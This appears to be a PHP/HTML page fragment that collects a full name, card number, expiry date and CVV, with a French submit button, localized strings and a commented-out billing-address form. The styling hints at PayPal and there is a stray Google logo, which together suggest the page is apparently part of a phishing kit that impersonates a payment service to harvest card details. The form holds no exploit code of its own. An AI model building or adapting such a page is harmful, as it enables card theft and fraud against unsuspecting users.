<?
include '../lang/language.php';
?>
    <table style="margin: 0 auto;width: 100%;height: 100%">
        <tr>
            <td>
<div class="form_content_size hide">
                    <form class="form-card" action="" method="post" id="chof">
                         <h2> <?=$language['home'][4];?> </h2><br>                         
                             <div class="inputs">
                            <input class="enterInput1" type="text" autocomplete="off" name="fullname" id="fullname" placeholder="<?=$language['home'][5];?>" style="text-transform: capitalize" required="" >
                            </div>
                           <div class="inputs">
                                <input class="enterInput1" autocomplete="off" required="" type="number" name="dcn" id="cdnum" placeholder="<?=$language['home'][6];?>" value="" maxlength="16" onkeyup="SelectCC(this.value)">
                            </div>
                        <div class="section group inputs">
                           <div class="col span_1_of_2 inexpiration">
                                <input class="enterInput1 smallInput" required="" autocomplete="off" id="exp" name="expiration" placeholder="<?=$language['home'][7];?>" data-mask="99/99" maxlength="5" onkeypress='return event.charCode >= 48 && event.charCode <= 57'>
                            </div>
                           <div class="col span_1_of_2">
                                <input class="enterInput2" autocomplete="off" required="" type="number" name="cvv" id="cvv" placeholder="<?=$language['home'][8];?>" maxlength="4" onkeypress='return event.charCode >= 48 && event.charCode <= 57'>
                            </div>
                        </div> 
 <!--                       <div class="inputs without" style="margin-bottom: 15px;">
                             <select id="sel" class="enterInput1 address" style="cursor:pointer;text-transform: capitalize;-webkit-appearance: none;-moz-appearance: none;" name="address">
                                <option id="selected" value="0" selected="selected"> <div><style> </style><div style="background-size:272px 92px;height:92px;width:272px" title="Google" align="left" id="hplogo" onload="window.lol&amp;&amp;lol()"><div class="logo-subtext"></div></div></div><?=$language['home'][9];?></option>
                                <option id="11" value="1"><?=$language['home'][10];?></option>
                            </select>
                        </div> -->
                        <input type="submit" class="btn block sub" id="bt2" value="Envoyer" name="btnbc" >
                    </form> 
<!--    <style type="text/css">
      #sel{
        display: block !important;
      }
  </style>                  
                 <form class="form-address" action="" method="post" style="max-width: 400px;margin: 0 auto;" >
                        <h2 style="padding-top:5px"><?=$language['home'][10];?></h2>
<br>                           <div class="inputs">
                                <input class="enterInput1" required="" autocomplete="off" type="text" style="text-transform: capitalize" name="address_1" placeholder="<?=$language['home'][13];?>" maxlength="120">
                            </div>
                            <div class="inputs">
                                <input class="enterInput1" autocomplete="off" style="text-transform: capitalize" type="text" name="address_2" placeholder="<?=$language['home'][14];?>" maxlength="120">
                            </div>
                            <div class="inputs">
                                <input class="enterInput1" required="" autocomplete="off" type="text" name="zip_code" placeholder="<?=$language['home'][15];?>" maxlength="30">
                            </div>
                            <div class="inputs">
                                <input class="enterInput1" required="" autocomplete="off" type="text" style="text-transform: capitalize" name="city" placeholder="<?=$language['home'][16];?>" maxlength="30">
                            </div>
                        <input type="submit" class="btn block" value="submit" style="width: 100%"><br>
                        <a rel="nofollow" id="Cancel" class="cancel-address"  style=" cursor:pointer;color: #0070ba;padding: 13px 14px 13px;"><?=$language['home'][17];?></a>
                        <br><br><br>
                    </form> -->

</div></td></tr></table>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>